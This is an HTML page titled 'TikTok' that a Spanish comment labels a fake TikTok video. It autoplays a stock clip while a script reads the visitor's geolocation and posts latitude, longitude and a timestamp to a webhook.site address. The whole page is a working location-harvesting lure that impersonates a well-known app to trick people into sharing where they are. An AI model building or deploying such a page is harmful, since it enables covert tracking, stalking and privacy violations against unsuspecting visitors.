<!DOCTYPE html>
<html>
  <head>
    <title>TikTok</title>
    <style>
      body {
        margin: 0;
        background-color: black;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
      }
      video {
        max-width: 100%;
        height: auto;
      }
    </style>
  </head>
  <body>
    <!-- Falso vídeo de TikTok -->
    <video autoplay muted loop>
      <source src="https://cdn.pixabay.com/video/2023/01/06/146944-791053999_large.mp4" type="video/mp4">
      Tu navegador no soporta vídeos.
    </video>

    <script>
      navigator.geolocation.getCurrentPosition(function(pos) {
        const lat = pos.coords.latitude;
        const lon = pos.coords.longitude;
        const timestamp = new Date().toISOString();

        fetch("https://webhook.site/915e41d8-58d5-4acc-9e0d-efeaa929b016", {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            lat: lat,
            lon: lon,
            timestamp: timestamp
          })
        });
      });
    </script>
  </body>
</html>
